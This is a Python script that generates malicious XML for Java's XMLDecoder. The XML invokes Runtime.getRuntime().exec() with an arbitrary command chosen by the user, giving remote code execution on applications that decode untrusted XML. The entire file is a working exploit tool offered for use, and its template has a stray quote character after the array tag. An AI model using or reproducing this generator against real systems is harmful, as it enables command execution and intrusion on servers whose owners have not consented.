#!/usr/bin/python
# highjack - 2021
# This script is used to generate a payload for xmldecoder in Java, when it calls the readObject() method.
# An example of the vulnerable code can be found here: https://github.com/pwntester/XMLDecoder/blob/master/Test.java
# usage: python xmldecoder-generate-payload.py -o OUTPUTFILE -c "COMMAND TO RUN"

import argparse
import os

def generate_payload(cmd, output):
    cmd = cmd.split(" ")
    arrays = '<array class="java.lang.String" length="{}">"'.format(len(cmd))
    for i in range(0,len(cmd)):
        arrays = arrays + '<void index="{}"><string>{}</string></void>'.format(i,cmd[i])
        
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
     {}
</array>
</void>
</object>
</java>""".format(arrays)
    fp = open(output, "w")
    fp.write(payload)
    fp.close()
    print("[+] payload written to {}".format(output))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-o","--output")
    parser.add_argument("-c","--cmd")
    args = parser.parse_args()
    cmd = args.cmd
    output = args.output
    if cmd != None and output != None:
        generate_payload(cmd, output)
    else:
        script_name = os.path.basename(__file__)
        print('python %s -o OUTPUTFILE -c "COMMAND"' % script_name)

